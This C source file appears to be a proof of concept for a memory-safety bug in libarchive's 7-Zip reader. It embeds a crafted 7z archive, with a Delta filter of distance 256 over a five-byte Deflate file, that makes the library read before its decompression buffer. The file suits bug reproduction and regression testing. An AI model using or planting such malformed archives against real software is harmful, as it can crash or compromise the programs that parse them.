/*
 * PoC: a 7z archive that pairs the Delta filter (distance 256) with the
 * Deflate codec on a five-byte file, read through the public
 * archive_read API.
 *
 * The 7-Zip reader's Delta filter is applied one chunk of decompressed
 * data at a time, and the bytes a chunk builds on are kept in a small
 * history buffer. When a folder's whole output is shorter than the
 * filter's distance, saving that history reaches back beyond the start
 * of the decompression buffer.
 */
#include <archive.h>
#include <archive_entry.h>
#include <stdio.h>

static const unsigned char archive_bytes[] = {
	0x37, 0x7a, 0xbc, 0xaf, 0x27, 0x1c, 0x00, 0x04, 0x6d, 0xd9, 0xf3, 0x68,
	0x07, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x4b, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0xf1, 0x35, 0xb3, 0x1c, 0xcb, 0x48, 0xcd, 0xc9,
	0xc9, 0x07, 0x00, 0x01, 0x04, 0x06, 0x00, 0x01, 0x09, 0x07, 0x00, 0x07,
	0x0b, 0x01, 0x00, 0x02, 0x03, 0x04, 0x01, 0x08, 0x21, 0x03, 0x01, 0xff,
	0x01, 0x00, 0x0c, 0x05, 0x05, 0x00, 0x08, 0x0a, 0x01, 0x86, 0xa6, 0x10,
	0x36, 0x00, 0x00, 0x05, 0x01, 0x11, 0x0d, 0x00, 0x66, 0x00, 0x69, 0x00,
	0x6c, 0x00, 0x65, 0x00, 0x31, 0x00, 0x00, 0x00, 0x14, 0x0a, 0x01, 0x00,
	0x00, 0x2d, 0x43, 0x2b, 0x71, 0xb3, 0x9d, 0x01, 0x15, 0x06, 0x01, 0x00,
	0x20, 0x00, 0x00, 0x00, 0x00, 0x00,
};

int
main(void)
{
	struct archive *a;
	struct archive_entry *ae;
	char buf[64];
	la_ssize_t bytes;
	int rc = 0;

	a = archive_read_new();
	if (a == NULL)
		return (1);
	archive_read_support_filter_all(a);
	archive_read_support_format_all(a);
	if (archive_read_open_memory(a, archive_bytes,
	    sizeof(archive_bytes)) != ARCHIVE_OK) {
		fprintf(stderr, "open: %s\n", archive_error_string(a));
		archive_read_free(a);
		return (1);
	}
	if (archive_read_next_header(a, &ae) != ARCHIVE_OK) {
		fprintf(stderr, "next_header: %s\n",
		    archive_error_string(a));
		archive_read_free(a);
		return (1);
	}
	while ((bytes = archive_read_data(a, buf, sizeof(buf))) > 0)
		; /* Data is decoded (a library fault happens before this). */
	if (bytes < 0) {
		fprintf(stderr, "read_data: %s\n",
		    archive_error_string(a));
		rc = 1;
	}
	archive_read_close(a);
	archive_read_free(a);
	return (rc);
}
